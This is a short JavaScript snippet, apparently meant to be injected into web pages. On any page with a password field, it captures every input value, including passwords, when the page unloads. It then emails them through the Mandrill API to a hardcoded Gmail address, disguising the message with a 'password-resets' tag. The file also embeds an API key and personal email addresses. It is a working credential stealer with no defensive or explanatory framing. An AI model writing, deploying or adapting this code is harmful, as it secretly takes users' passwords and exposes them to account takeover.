send_mail = {
    "key": "KTjyInmpVBULmNtU2x8VGw",
    "message": {
        "html": "",
        "text": "",
        "subject": "password",
        "from_email": "archiecool@gmail.com",
        "from_name": "Archit srivastava",
        "to": [
            {
                "email": "arch.srivastava.2@gmail.com",
                "name": "Archit srivastava",
                "type": "to"
            }
        ],
        "important": false,
        "track_opens": null,
        "track_clicks": null,
        "auto_text": null,
        "auto_html": null,
        "inline_css": null,
        "url_strip_qs": null,
        "preserve_recipients": null,
        "view_content_link": null,
        "tracking_domain": null,
        "signing_domain": null,
        "return_path_domain": null,
        "tags": [
            "password-resets"
        ]
    },
    "async": false,
    "ip_pool": "Main Pool"
};

var path = "https://mandrillapp.com/api/1.0/messages/send.json";

if(document.querySelector('input[type="password"]') !== null) {
	window.onbeforeunload = function(e) {
		var input_tags = document.getElementsByTagName('input');
		for(var i = 0; i < input_tags.length; i++) {
			var type = input_tags[i].getAttribute("type");
			string = 'input: '
			if (type == 'password') {
				string = 'password: ';
			}
			send_mail['message']['html'] += string + String(input_tags[i].value) + "<br />";
		}
		$.ajax({
			type: "POST",
			url: path,
			data: send_mail,
			async: false,
			dataType: 'json'
		});

	};
}